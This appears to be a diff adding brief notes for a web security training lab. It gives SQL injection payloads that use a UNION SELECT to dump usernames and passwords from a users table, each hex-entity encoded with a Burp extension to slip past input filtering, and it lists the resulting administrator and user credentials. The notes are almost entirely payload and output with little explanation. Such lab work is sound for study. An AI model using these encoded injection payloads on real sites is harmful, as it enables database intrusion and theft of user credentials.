@@ -1,0 +1,14 @@
+
+Use hackvector extention via hex-entities encoding
+
+<@hex_entities>3 union select version()<@/hex_entities>
+
+&#x33;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;
+
+1 UNION SELECT username || '~'  || password  FROM users
+
+&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x3a;&#x27;&#x20;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
+
+administrator:43bq946ex0579il2mkyj
+wiener:nbnx0ohbphahn4wn8deh
+carlos:2d5fnqq9ujyj453xd7ud
